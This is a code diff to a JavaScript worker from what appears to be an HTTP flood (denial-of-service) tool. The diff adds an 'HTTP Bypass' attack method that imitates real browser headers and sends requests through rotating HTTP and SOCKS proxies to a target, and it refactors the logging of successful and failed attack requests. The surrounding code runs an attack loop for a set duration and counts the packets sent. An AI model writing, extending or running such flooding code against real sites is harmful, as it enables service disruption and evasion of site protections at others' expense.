@@ -3,6 +3,13 @@ import { parentPort, workerData } from "worker_threads";
 import HTTPBot from "../utils/httpBot.js";
 import { randomItem } from "../utils/randomUtils.js";
 
+export const info = {
+  id: "http_bypass",
+  name: "HTTP Bypass",
+  description: "Mimics real browser requests to bypass protections.",
+  supportedProtocols: ["http", "https", "socks4", "socks5"],
+};
+
 const HTTP_ACCEPT_HEADERS = [
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -52,13 +59,26 @@ const startAttack = () => {
       responseCallback: (error) => {
         if (error) {
           parentPort.postMessage({
-            log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
+            log: {
+              key: "request_failed",
+              params: {
+                proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+                target: fixedTarget,
+                error: error.message,
+              },
+            },
             totalPackets,
           });
         } else {
           totalPackets++;
           parentPort.postMessage({
-            log: `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
+            log: {
+              key: "request_success",
+              params: {
+                proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+                target: fixedTarget,
+              },
+            },
             totalPackets,
           });
         }
@@ -80,7 +100,7 @@ const startAttack = () => {
 
   setTimeout(() => {
     clearPool();
-    parentPort.postMessage({ log: "Attack finished", totalPackets });
+    parentPort.postMessage({ log: { key: "attack_finished" }, totalPackets });
     process.exit(0);
   }, duration * 1000);
 
